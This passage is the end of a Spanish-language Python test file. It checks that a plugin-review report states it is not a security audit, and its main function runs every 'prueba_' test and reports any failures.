          etiqueta, "revision-de-seguridad")


def prueba_publicar_dice_que_no_es_una_auditoria():
    #  Que el informe no prometa más de lo que hace no es cosmética: es la
    #  diferencia entre un sello útil y uno que engaña.
    d = {"repo": "https://github.com/quien/que", "commit": "a" * 40,
         "carpeta": ""}
    res = {"ok": True, "commit": "a" * 40,
           "plugin": {"id": "x", "title": "X", "description": "d",
                      "permisos": []}}
    texto, _ = publicar.informe(d, [], res)
    contiene("lo dice en el informe", texto, "no es una auditoría de seguridad")


def main():
    pruebas = [v for k, v in sorted(globals().items())
               if k.startswith("prueba_")]
    for p in pruebas:
        p()

    if fallos:
        print("%d de %d comprobaciones fallan:\n" % (len(fallos), len(pruebas)))
        for f in fallos:
            print("  " + f + "\n")
        return 1
    print("%d pruebas, todas pasan." % len(pruebas))
    return 0


if __name__ == "__main__":
    sys.exit(main())
